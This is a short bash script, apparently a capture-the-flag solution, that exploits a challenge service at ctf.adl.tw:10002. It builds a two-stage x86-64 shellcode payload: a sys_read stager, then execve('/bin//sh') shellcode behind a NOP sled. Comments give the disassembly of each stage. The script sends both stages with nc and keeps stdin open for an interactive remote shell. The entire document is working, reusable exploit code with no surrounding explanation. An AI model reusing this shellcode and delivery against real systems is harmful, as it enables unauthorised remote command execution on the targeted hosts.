#!/bin/bash

if [[ -e payload_5_1 ]]; then
    rm payload_5_1
fi
if [[ -e payload_5_2 ]]; then
    rm payload_5_2
fi

host="ctf.adl.tw"
port="10002"

shellcode_sys_read="\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05"
: << Instruction
48 89 c7                mov    rdi, rax
48 31 d2                xor    rdx, rdx
66 ba ff 0f             mov    dx, 0xfff
48 31 c0                xor    rax, rax
0f 05                   syscall
Instruction

echo -ne $shellcode_sys_read > payload_5_1

shellcode_sys_exeve="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
: << Instruction
48 31 f6                xor    rsi, rsi
56                      push   rsi
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f  # encoded from "/bin//sh"
2f 73 68
57                      push   rdi
54                      push   rsp
5f                      pop    rdi
6a 3b                   push   0x3b
58                      pop    rax
99                      cdq
0f 05                   syscall
Instruction

echo -ne $(printf "\x90%.0s" $(seq 1 15))$shellcode_sys_exeve > payload_5_2

(cat payload_5_1; cat payload_5_2; cat - ) | nc $host $port
